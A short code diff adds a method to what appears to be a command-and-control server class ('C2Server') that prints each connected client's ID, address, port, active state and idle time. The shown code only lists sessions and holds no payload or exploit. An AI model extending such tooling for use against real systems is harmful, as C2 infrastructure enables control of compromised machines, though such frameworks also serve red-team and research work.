@@ -86,3 +86,14 @@ class C2Server:
                 target.set_time(time.time())
             except Exception:
                 target.close()
+
+    def list_command(self):
+        with self.lock:
+            for client in self.clients.values():
+                with client.lock:
+                    state = "ACTIVE" if client.active else "INACTIVE"
+                    idle = int(time.time() - client.last_seen)
+                    print(
+                        f"{client.unique_id} -> {client.ip}:{client.port} "
+                        f"{state} idle:{idle}s"
+                    )
